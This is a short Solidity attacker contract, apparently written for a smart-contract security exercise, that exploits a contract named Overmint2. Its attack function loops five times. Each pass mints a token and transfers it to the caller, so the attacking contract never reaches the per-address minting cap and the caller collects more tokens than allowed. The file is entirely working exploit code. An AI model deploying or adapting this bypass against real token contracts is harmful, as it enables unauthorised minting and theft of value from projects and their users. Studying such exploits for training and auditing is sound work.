// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.11;

import {Overmint2} from "./Overmint2.sol";

/// @title Overmint 2 Attacker
/// @author Julissa Dantes
/// @notice This contract will exploit Overmint 2 to bypass the minting restriction
contract Overmint2Attacker {
    address public victim;

    constructor(address _victim) {
        victim = _victim;
    }

    /// @notice Allows a different address to get the minted token allowin their balance to be bigger than the max minting amount
    function attack() external {
        for (uint256 i = 0; i < 5; i++) {
            Overmint2(victim).mint();
            Overmint2(victim).transferFrom(address(this), msg.sender, Overmint2(victim).totalSupply());
        }
    }
}
